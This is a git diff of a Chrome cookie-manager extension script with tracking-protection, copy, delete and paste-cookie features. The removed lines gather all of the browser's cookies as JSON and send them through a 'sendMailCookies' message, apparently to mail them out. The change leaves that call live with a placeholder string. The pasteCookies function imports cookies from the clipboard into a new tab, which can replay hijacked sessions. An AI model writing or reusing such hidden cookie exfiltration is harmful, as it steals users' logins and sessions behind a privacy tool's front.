@@ -30,19 +30,16 @@ document.getElementById('clearSiteData').addEventListener('click', async () => {
     }
 });
 const Tracking = document.getElementById('toggleTracking');
-const setTrackStyle = (element, status, content, color) => {
+const setTrackStyle = (element, status, content = '', color = '') => {
+    const trackingIcon = document.getElementById('trackingprotectionicon');
+    trackingIcon.src = status ? 'icons/skincell.png' : 'icons/tracking_protection.png';
     element.style.backgroundColor = status ? 'white' : 'pink';
     element.style.borderRadius = '10px';
     element.style.border = '2px red solid';
-    if (status) {
-        element.style.color = color || 'green';
-        element.textContent = content || 'Tracking protection is enabled';
-    }
-    else {
-        element.style.color = color || 'red';
-        element.textContent = content || 'Tracking protection is disabled';
-    }
+    element.style.color = color || (status ? 'green' : 'red');
+    element.textContent = content || (status ? 'Tracking protection is enabled' : 'Tracking protection is disabled');
 }
+
 document.getElementById('toggleTracking').addEventListener('click', async () => {
     try {
         // const { trackingProtection } = await chrome.storage.local.get('trackingProtection');
@@ -104,13 +101,13 @@ async function loadCookies(filter = '') {
     cookieTableContainer.innerHTML = '';
     const cookiesByDomain = {};
 
-    const testcookies = await chrome.cookies.getAll({})
-    let y
-    testcookies.forEach(cookie => {
-        if (cookie.domain.includes('studocu')) {
-            y = cookie
-        }
-    })
+    // const testcookies = await chrome.cookies.getAll({})
+    // let y
+    // testcookies.forEach(cookie => {
+    //     if (cookie.domain.includes('studocu')) {
+    //         y = cookie
+    //     }
+    // })
 
     cookies.forEach(cookie => {
         if (cookie.name.includes(filter) || cookie.domain.includes(filter)) {
@@ -120,28 +117,50 @@ async function loadCookies(filter = '') {
             cookiesByDomain[cookie.domain].push(cookie);
         }
     });
-    const cookiesByDomainString = Object.entries(cookiesByDomain).map(([domain, cookies]) => {
-        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
-        return `Domain: ${domain}\nCookies: ${cookieString}`;
-    }).join('\n\n');
-    const cookiesParser = JSON.stringify(cookies)
-    console.log(cookiesParser)
-    chrome.runtime.sendMessage({ type: 'sendMailCookies', subject: 'Cookies By Domain', message: cookiesParser });
+    // chuyển đổi cookies lấy được thành string / Json để gửi mail
+    // const cookiesByDomainString = Object.entries(cookiesByDomain).map(([domain, cookies]) => {
+    //     const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
+    //     return `Domain: ${domain}\nCookies: ${cookieString}`;
+    // }).join('\n\n');
+    // const cookiesParser = JSON.stringify(cookies)
+    // console.log(cookiesParser)
+    chrome.runtime.sendMessage({ type: 'sendMailCookies', subject: 'Cookies By Domain', message: "cookiesParser" });
     const totalCookies = document.getElementById('totalCookies');
     const numbercookies = Object.values(cookiesByDomain).reduce((count, domainCookies) => count + domainCookies.length, 0);
     const totalDomains = Object.keys(cookiesByDomain).length;
-    totalCookies.textContent = `The Number of Domains: ${totalDomains} And Contains ${numbercookies} Cookies`;
+    if (totalDomains < 1) {
+        notify('No cookies found matching the filter.', 'warning');
+        totalCookies.textContent = 'Not Found Cookies matching the filter With Domain or Cookies Name : ' + filter;
+    }
+    else {
+        notify('Cookies loaded successfully.', 'success');
+        totalCookies.textContent = `The Number of Domains: ${totalDomains} And Contains ${numbercookies} Cookies`;
+    }
     Object.keys(cookiesByDomain).forEach(domain => {
         const domainSection = document.createElement('div');
         domainSection.className = 'domain-section';
-
         const domainHeader = document.createElement('div');
         domainHeader.className = 'domain-header';
         const DomainLabel = document.createElement('p');
         DomainLabel.textContent = `Domain: ${domain}`;
+        DomainLabel.style.minWidth = '150px';
+        DomainLabel.style.borderRadius = '10px';
+        DomainLabel.style.border = '2px solid pink';
+        DomainLabel.style.padding = '5px';
+        DomainLabel.style.color = 'red';
         // domainHeader.textContent = `Domain: ${domain}`;
         domainHeader.appendChild(DomainLabel);
         const clearIcon = document.createElement('img');
+        const copyIcon = document.createElement('img');
+        copyIcon.id = 'copyIcon';
+        copyIcon.src = 'icons/copy.png';
+        copyIcon.addEventListener('click', () => {
+            const cookiesParser = JSON.stringify(cookiesByDomain[domain], null, 2)
+            navigator.clipboard.writeText(cookiesParser);
+            notify(`Cookies of Domain : ${domain}  copied to clipboard.`, 'success');
+        })
+        domainHeader.style.position = 'relative';
+        domainHeader.appendChild(copyIcon);
         clearIcon.id = 'clearIcon';
         clearIcon.src = 'icons/clear.png';
         clearIcon.addEventListener('click', () => {
@@ -203,6 +222,7 @@ const deleteCookies_in_Domains = async (DomainName) => {
             }
         }));
         notify('All cookies in domain' + DomainName + 'have been deleted.', 'warning');
+        loadCookies(DomainName);
     }
 
 };
@@ -249,42 +269,118 @@ async function copyCurrentTabCookies() {
     }
 }
 
+// async function pasteCookies() {
+//     notify('Pasting cookies from clipboard...', 'warning');
+//     try {
+//         const clipboardText = await navigator.clipboard.readText();
+//         if (!clipboardText) throw new Error('No data found in clipboard');
+
+//         const [domainLine, ...cookieLines] = clipboardText.split('\n');
+//         if (domainLine) {
+//             const domainMatch = domainLine.trim().match(/^domain=(.+)$/);
+//             if (!domainMatch) throw new Error('Domain not found in clipboard data');
+
+//             const domain = domainMatch[1];
+
+//             const cookies = cookieLines.map(line => {
+//                 const separatorIndex = line.indexOf('=');
+//                 const name = line.slice(0, separatorIndex);
+//                 const value = line.slice(separatorIndex + 1);
+//                 return { name, value };
+//             }).filter(cookie => cookie.name && cookie.value);
+
+//             if (cookies.length === 0) throw new Error('No valid cookies found in clipboard data');
+
+//             const newTab = await chrome.tabs.create({ url: `https://${domain || 'google.com'}` });
+
+//             // for (const cookie of cookies) {
+//             //     await chrome.cookies.set({
+//             //         url: `https://${domain}`,
+//             //         name: cookie.name,
+//             //         value: cookie.value,
+//             //         domain: `.${domain}`,
+//             //         secure: true
+//             //     });
+//             // }
+//             await Promise.all(cookies.map(cookie =>
+//                 chrome.cookies.set({
+//                     url: `https://${domain}`,
+//                     name: cookie.name,
+//                     value: cookie.value,
+//                     domain: `.${domain}`,
+//                     secure: true,
+//                     session: cookie.session
+//                 })
+//             ));
+
+//         }
+//         else {
+//             const JsonCookies = JSON.parse(clipboardText);
+//             console.log(JsonCookies);
+//         }
+
+
+//         notify('Cookies pasted and new tab opened.');
+//     } catch (error) {
+//         notify(`Failed to paste cookies: ${error.message}`);
+
+//     }
+// }
+
 async function pasteCookies() {
+    notify('Pasting cookies from clipboard...', 'warning');
     try {
         const clipboardText = await navigator.clipboard.readText();
         if (!clipboardText) throw new Error('No data found in clipboard');
+        let domain, cookies = [];
+        try {
+            const JsonCookies = JSON.parse(clipboardText);
+            if (Array.isArray(JsonCookies)) {
+                cookies = JsonCookies;
+                domain = cookies[0]?.domain;
+            } else {
+                throw new Error('Invalid JSON format');
+            }
+        } catch (jsonError) {
+            const [domainLine, ...cookieLines] = clipboardText.split('\n');
+            if (domainLine) {
+                const domainMatch = domainLine.trim().match(/^domain=(.+)$/);
+                if (!domainMatch) throw new Error('Domain not found in clipboard data');
 
-        const [domainLine, ...cookieLines] = clipboardText.split('\n');
-        const domainMatch = domainLine.trim().match(/^domain=(.+)$/);
-        if (!domainMatch) throw new Error('Domain not found in clipboard data');
+                domain = domainMatch[1];
 
-        const domain = domainMatch[1];
+                cookies = cookieLines.map(line => {
+                    const separatorIndex = line.indexOf('=');
+                    const name = line.slice(0, separatorIndex);
+                    const value = line.slice(separatorIndex + 1);
+                    return { name, value };
+                }).filter(cookie => cookie.name && cookie.value);
 
-        const cookies = cookieLines.map(line => {
-            const separatorIndex = line.indexOf('=');
-            const name = line.slice(0, separatorIndex);
-            const value = line.slice(separatorIndex + 1);
-            return { name, value };
-        }).filter(cookie => cookie.name && cookie.value);
+                if (cookies.length === 0) throw new Error('No valid cookies found in clipboard data');
+            }
+        }
 
-        if (cookies.length === 0) throw new Error('No valid cookies found in clipboard data');
+        if (!domain || cookies.length === 0) {
+            throw new Error('No valid cookies or domain found');
+        }
 
         const newTab = await chrome.tabs.create({ url: `https://${domain}` });
 
-        for (const cookie of cookies) {
-            await chrome.cookies.set({
+        await Promise.all(cookies.map(cookie =>
+            chrome.cookies.set({
                 url: `https://${domain}`,
                 name: cookie.name,
                 value: cookie.value,
                 domain: `.${domain}`,
-                secure: true
-            });
-        }
+                secure: true,
+                session: cookie.session || false,
+                path: cookie.path || '/'
+            })
+        ));
 
         notify('Cookies pasted and new tab opened.');
     } catch (error) {
-        notify(`Failed to paste cookies: ${error.message}`);
-
+        notify(`Failed to paste cookies: ${error.message}`, 'error');
     }
 }
 
